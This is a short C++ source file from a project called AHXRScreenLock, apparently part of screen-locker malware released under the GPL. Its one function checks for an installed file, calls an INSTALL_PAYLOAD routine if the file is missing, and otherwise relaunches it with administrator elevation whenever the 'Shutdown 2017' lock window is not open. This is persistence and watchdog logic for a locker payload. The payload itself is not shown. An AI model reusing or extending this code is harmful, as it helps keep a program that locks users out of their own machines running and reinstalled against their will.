/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include					"stdafx.h"
#include					"payload_scan.h"
#include					"payload_install.h"

#include					<sys/stat.h>
#include					<string>

using namespace				std;

void startShutdownScan() {
	string s_path = getInstallPath() + string("\\") + SHUTDOWN_FILE_NAME;

	struct stat buffer;
	if (stat(s_path.c_str(), &buffer) != 0) {
		INSTALL_PAYLOAD();
	}
	else {

		HWND h_lockdown;

		h_lockdown = FindWindow(NULL, "Shutdown 2017");
		if (h_lockdown == NULL) {
			/*STARTUPINFO info = { sizeof(info) };
			PROCESS_INFORMATION processInfo;

			CreateProcess(s_path.c_str(), "", NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
		*/
			ShellExecute(NULL, "runas", s_path.c_str(),
				" c:\\temp\\report.txt",
				NULL,                        // default dir 
				SW_SHOWNORMAL
			);
		}
	}
}